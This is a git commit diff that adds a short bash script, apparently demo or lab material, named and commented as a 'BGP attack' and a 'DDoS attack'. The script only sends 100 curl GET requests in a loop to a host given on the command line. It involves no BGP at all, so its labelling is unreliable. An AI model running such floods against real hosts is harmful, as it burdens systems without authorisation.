7258cc8e6b2f7ccd0b09a6d462c67d0aeb030603
amirhnajafiz <najafizadeh21@gmail.com>
2023-09-30 09:54:53 +0330

    add: bgp attack

--- data/attacks/bgp.sh
+++ data/attacks/bgp.sh
@@ -1,3 +1,22 @@
 #!/usr/bin/env bash
 
-echo "This is BGP";
+
+# get host to perform attack
+HOST=$1
+
+# message
+echo "Starting BGP attack ...";
+
+echo "performing at:";
+
+# print date to set attack
+date "+%Y/%m/%d %H:%M:%S";
+
+# make a loop to perform DDoS attack
+for _ in {1..100}
+do
+  TMP=$(curl -X GET "$HOST")
+  echo Got: "$TMP"
+done
+
+exit 0;
